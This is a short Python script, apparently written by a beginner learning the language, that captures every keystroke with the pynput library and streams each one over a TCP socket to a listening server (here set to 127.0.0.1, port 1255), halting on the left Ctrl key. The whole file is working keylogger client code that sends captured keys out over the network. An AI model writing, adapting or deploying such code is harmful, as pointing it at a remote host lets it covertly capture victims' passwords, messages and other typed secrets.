import socket
from pynput.keyboard import Listener

#same jazz as server side.
s_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 1255
s_soc.connect((host, port))

def serverconnection(key):
    in_serv = key
    if in_serv != "Key.ctrl_l": 
        s_soc.send(in_serv.encode("utf-8"))
    elif in_serv == "Key.ctrl_l": #disconnection cue.
        print("Connection terminated") #let me know it's done.   
        s_soc.close()
        return False 
        

def on_press(key):
    pressed_key = str(key) #keep everything as a string to make life easier.
    pressed_key = pressed_key.replace("'","")    #needed to get rid of them the minute I saw them.
    serverconnection(pressed_key)    
    if pressed_key == "Key.ctrl_l": #disconnection cue.
        print("Logger terminated")    #let me know it's done.   
        return False      
    
with Listener(on_press = on_press) as listener:  #I had a difficult time understanding this bit, since I started programming Python 12 hours ago lol
    listener.join() #but I wrote a random text file with this statement (key logging) and it made A LOT more sense.